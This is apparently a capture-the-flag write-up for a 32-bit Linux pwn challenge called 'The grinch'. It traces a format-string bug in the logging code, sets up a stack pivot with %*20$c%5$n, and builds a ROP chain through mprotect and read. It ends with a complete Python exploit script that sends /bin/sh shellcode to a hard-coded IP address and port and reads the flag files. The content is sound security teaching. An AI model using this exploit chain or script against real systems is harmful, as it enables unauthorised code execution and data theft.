# The grinch - Pwn (350)

We have found an interface used by the Grinch's organisation. It looks locked down but perhaps you can find a flaw.

Service: nc 18.205.93.120 1220

Download: [umGmZ35YVATQyuHNjZvHhb2O3sZpYKQg-the_grinch.tar.gz](umGmZ35YVATQyuHNjZvHhb2O3sZpYKQg-the_grinch.tar.gz) [(mirror)](./static/umGmZ35YVATQyuHNjZvHhb2O3sZpYKQg-the_grinch.tar.gz)

## Format String

Starting with disassembly, there is a fair bit of logic going on here. A lot of it seems unnecessary - other than to have certain functions (like mprotect, fread, read, etc) all included in the program's [GOT](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html). Some _very rough_ pseudocode for main() is:

```
random = mmap(size=pagesize)
fill_with_urandom(random)
mprotect(random,prot=READ)
logfile = fopen("/dev/null")
username = calloc(0x10)
password = calloc(0x40)
write_banner()
fwrite("username:")
scanf("%13s",username)
fwrite("password:")
fread_password(password)
log(username,password)
if memcmp(password,random) == 0:
  fwrite("passed!")
  fwrite("TODO")
else:
  fwrite("failed!")
  exit()
```

Looking at this, we can see that there is some weirdness with random bytes. However, since these are being compared to "password" which presumably is some user defined shellcode-like bytes it might be a dead end to look at this further. The next interesting piece is the logging. Following this down the rabbit hole we have a couple more functions (pseudocode):

```
// from main
logfile = fopen("/dev/null")

def log(username,password)
  new_username = calloc(0x11)
  snprintf(new_username,0x10,"%s\n",username)
  log_username(new_username)

def log_username(new_username)
  log_message(" logged -> ")
  log_message(new_username)

def log_message(msg)
  fprintf(logfile,msg)
```

From here, we can trace a line directly from some user input ("username") to a format string function (fprintf). Format strings are [a well known attack vector](https://www.owasp.org/index.php/Format_string_attack), so we've finally found our first thread to unravel for this challenge.

## Stack Pivot

Now that we have a format string vulnerability, the next step is to figure out some more specific details on what we can do. I copied the binary to my own Ubuntu VM, loaded it in gdb, set a breakpoint at the instruction where fprintf was called (0x08048994) and looked at the stack state. A snippet of some gdb commands is below.

```
(gdb) break *0x08048994
Breakpoint 1 at 0x8048994
(gdb) r
...
 username: aaa
 password: bbb

Breakpoint 1, 0x08048994 in ?? ()
(gdb) c
Continuing.

Breakpoint 1, 0x08048994 in ?? ()
(gdb) x/64wx $esp
0xffffd4d0:	0x08054160	0x08054330	0xf7e4d319	0x0804897e
0xffffd4e0:	0xf7fb4000	0x08052f94	0xffffd508	0x080489cf
0xffffd4f0:	0x08054330	0x00000010	0x08048db8	0x080489ad
0xffffd500:	0xf7fb4000	0xf7e2fb96	0xffffd538	0x08048a1b
0xffffd510:	0x08054330	0x00000010	0x08048db8	0x080542c0
0xffffd520:	0x00000000	0x080542e0	0x00000040	0x08054330
0xffffd530:	0xf7fb4000	0x08052f94	0xffffd568	0x08048c6a
0xffffd540:	0x080542c0	0x080542e0	0x00000013	0xf7fb4d80
0xffffd550:	0x00000001	0xf7fce000	0x080542c0	0x080542e0
0xffffd560:	0xffffd580	0x00000000	0x00000000	0xf7df7e81
0xffffd570:	0xf7fb4000	0xf7fb4000	0x00000000	0xf7df7e81
0xffffd580:	0x00000001	0xffffd614	0xffffd61c	0xffffd5a4
0xffffd590:	0x00000001	0xffffd614	0xf7fb4000	0xf7fe575a
0xffffd5a0:	0xffffd610	0x00000000	0xf7fb4000	0x00000000
0xffffd5b0:	0x00000000	0x254eba90	0x64193c80	0x00000000
0xffffd5c0:	0x00000000	0x00000000	0x00000040	0xf7ffd024
(gdb) x/s 0x08054330
0x8054330:	"aaa\n"
```

I also want to know how the stack unravels so it helps to print the backtrace, make some "next instruction" (ni) steps out of several functions.

```
(gdb) bt
#0  0x08048994 in ?? ()
#1  0x080489cf in ?? ()
#2  0x08048a1b in ?? ()
#3  0x08048c6a in ?? ()
#4  0xf7df7e81 in __libc_start_main () from /lib32/libc.so.6
#5  0x08048752 in ?? ()
(gdb) i r
esp            0xffffd4d0	0xffffd4d0
ebp            0xffffd4e8	0xffffd4e8
(gdb) ni
0x08048999 in ?? ()
...
0x080489cf in ?? ()
(gdb) i r
esp            0xffffd4f0	0xffffd4f0
ebp            0xffffd508	0xffffd508
(gdb) ni
0x080489d2 in ?? ()
...
0x08048a1b in ?? ()
(gdb) i r
esp            0xffffd510	0xffffd510
ebp            0xffffd538	0xffffd538
(gdb) ni
0x08048a1e in ?? ()
...
0x08048c6a in ?? ()
(gdb) i r
esp            0xffffd540	0xffffd540
ebp            0xffffd568	0xffffd568
```

Whats basically happening here is we have a format string vuln, followed by several sets of `leave; ret` instruction pairs move around the `ebp` and `esp` registers. This is pretty much exactly what we need for a stack pivot.

Revisitng the stack right before the fprintf() call, we can identify several pieces:

```
(gdb) x/64wx $esp
0xffffd4d0:	0x08054160	0x08054330	0xf7e4d319	0x0804897e
0xffffd4e0:	0xf7fb4000	0x08052f94	0xffffd508	0x080489cf      leave sets esp := 0xffffd4e8, ebp := 0xffffd508
                                                                ret sets eip := 0x080489cf (jump)
0xffffd4f0:	0x08054330	0x00000010	0x08048db8	0x080489ad
0xffffd500:	0xf7fb4000	0xf7e2fb96	0xffffd538	0x08048a1b      leave sets esp := 0xffffd508, ebp := 0xffffd538
                                                                ret sets eip := 0x08048a1b
0xffffd510:	0x08054330	0x00000010	0x08048db8	0x080542c0
0xffffd520:	0x00000000	0x080542e0	0x00000040	0x08054330
0xffffd530:	0xf7fb4000	0x08052f94	0xffffd568	0x08048c6a      leave sets esp := 0xffffd538, ebp := 0xffffd568
                                                                ret sets eip := 0x08048c6a
0xffffd540:	0x080542c0	0x080542e0	0x00000013	0xf7fb4d80
0xffffd550:	0x00000001	0xf7fce000	0x080542c0	0x080542e0
0xffffd560:	0xffffd580	0x00000000	0x00000000	0xf7df7e81
0xffffd570:	0xf7fb4000	0xf7fb4000	0x00000000	0xf7df7e81
0xffffd580:	0x00000001	0xffffd614	0xffffd61c	0xffffd5a4
0xffffd590:	0x00000001	0xffffd614	0xf7fb4000	0xf7fe575a
0xffffd5a0:	0xffffd610	0x00000000	0xf7fb4000	0x00000000
0xffffd5b0:	0x00000000	0x254eba90	0x64193c80	0x00000000
0xffffd5c0:	0x00000000	0x00000000	0x00000040	0xf7ffd024

0x08054330 == username (copy) -- format string
0x080542e0 == "password" input
0x080542c0 == username (original)
0xf7fce000 == mmap'd urandom data
```

So if we can somehow set one of the stack positions where `leave` is executed, then ebp will be set to a value of our choice, and then one set of `leave; ret` later `ebp` will be moved into `esp` and we'll have achieved our stack pivot. So basically, we want to set address `0xffffd4e0` to value `0x080542e0`, the position of our "password" data. At this point, I got stuck - I knew that using the `%n` format (or `%hhn`) would write the current number of printed characters into that parameter offset, but didn't quite realize how `$` and `*` could be used. Reading through [the printf man page](https://linux.die.net/man/3/printf), we can see how parameters can be accessed out of order using the `$` character and `*` gives the field width in an argument. Putting all this together we can do the following:

```
%*20$c      -- print a character with field width found in the 20th argument (address 0xffffd524, value 0x080542e0, our "password" input)
%5$n        -- write the current number of characters written (0x080542e0 given the prior format) to the 5th argument (offset 0xffffd4e8)
```

Using both of these together we can input this for our "username" input and step in gdb to see the result.

```
(gdb) r
...
 username: %*20$c%5$n
 password: abcdefghijklmn

Breakpoint 1, 0x08048994 in ?? ()
(gdb) ni
0x08048999 in ?? ()
...
0x08048a23 in ?? ()
(gdb) x/i $eip
=> 0x8048a23:	ret    
(gdb) x/20wx $esp
0x80542e4:	0x68676665	0x6c6b6a69	0x000a6e6d	0x00000000
0x80542f4:	0x00000000	0x00000000	0x00000000	0x00000000
0x8054304:	0x00000000	0x00000000	0x00000000	0x00000000
0x8054314:	0x00000000	0x00000000	0x00000000	0x00000000
0x8054324:	0x00000000	0x00000000	0x00000021	0x30322a25
(gdb) ni
0x68676665 in ?? ()
```

This shows that the format string worked, sets up `esp` to "password+4" and then hits a `ret` instruction.

## ROP and Shellcode

At this point, we have a 0x3c-long ROP chain which we need to turn into shellcode. None of the memory we have available is both write and execute so we'll have to call mprotect() at some point. Doing this means that we don't quite have enough room in our ROP chain to store both the ROP and shellcode so we'll also have to read in some new memory as well. Some helpful addresses we have are:

```
0x080485D0 -- jump to mprotect() system call
0x080485E0 -- jump to read() system call
0x080485AE -- ROP gadget to: 'add $esp, 8', 'pop ebx', 'ret'
```

Setting these up in a ROP chain, we can call mprotect() with our own given parameters, then call read() to read in new shellcode into the mprotect'd memory, and then jump to the shellcode. The ROP chain is shown below:

```
password+0:  0              -- unused
password+4:  0x080485D0     -- return #1 to mprotect()
password+8:  0x080485AE     -- return #2 to adjust esp
password+12: 0x08048000     -- mprotect parameter #1, the address
password+16: 0x1000         -- mprotect parameter #2, the size
password+20: 7              -- mprotect parameter #3, read/write/execute
password+24: 0x080485E0     -- return #3 to read()
password+28: 0x08048DBC     -- return #4 to shellcode
password+32: 0              -- read parameter #1, stdin file descriptor
password+36: 0x08048DBC     -- read parameter #2, shellcode address
password+40: 0x40           -- read parameter #3, shellcode size
```

## Solution

Finally, putting all of this together in a script we can send our format string, ROP chain, and shellcode to the server.

```python
import socket
import time
import sys
import struct

addr_esp_plus_c = 0x080485AE
addr_mprotect = 0x080485D0
addr_shellcode = 0x08048DBC
addr_read = 0x080485E0
size_shellcode = 0x40
ROP = struct.pack('IIIIIIIIIII',0,addr_mprotect,addr_esp_plus_c,addr_shellcode&~0xfff,0x1000,7,addr_read,addr_shellcode,0,addr_shellcode,size_shellcode)
ROP = ROP + bytes([0xcc]*(0x40-len(ROP)))

# msfvenom -p linux/x86/exec CMD=/bin/sh -f python
SHELLCODE = b''
SHELLCODE += b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f"
SHELLCODE += b"\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08"
SHELLCODE += b"\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53"
SHELLCODE += b"\x89\xe1\xcd\x80"
SHELLCODE = SHELLCODE + bytes([0xcc]*(size_shellcode-len(SHELLCODE)))

def do_send(username):

	s = socket.socket()
	s.settimeout(10)
	s.connect(('18.205.93.120',1220))
	data = b''
	while not data.endswith(b'username:\x1b[0m '):
		data = data + s.recv(10240)
	username = username + b' ' * (11-len(username))

	s.send(username+ROP+SHELLCODE)
	print(s.recv(1024))

	time.sleep(1)
	s.send(b'cat flag\n')
	s.send(b'ls -al\n')
	s.send(b'cat the_real_flag\n')
	try:
		data = s.recv(1024)
		while len(data) > 0:
			print(data.decode('ascii'))
			data = s.recv(1024)
		return True
	except socket.timeout as e:
		print('timeout:',e)
	return False

if __name__ == '__main__':

	do_send(b'%*34$c%5$n')
```

Running this gives the flag, not in the normal `flag` file, but instead in `the_real_flag`.

```
$ ./challenge20.py 
b' \x1b[1mpassword:\x1b[0m '
this is not the flag... try harder

total 64
drwxr-xr-x 1 root ctf   4096 Dec 20 09:21 .
drwxr-xr-x 1 root root  4096 Dec 20 05:14 ..
-r--r----- 1 root ctf     35 Dec 20 05:13 flag
-rwxr-x--- 1 root ctf  42328 Dec 20 09:20 grinch
-rwxr-x--- 1 root ctf     38 Dec 20 05:13 redir.sh
-r--r----- 1 root ctf     52 Dec 20 05:13 the_real_flag

AOTW{7h3_gr1NcH_t4K3z_ELF_aNd_sAfTeY_vEry_s3r1OslY}

timeout: timed out
```
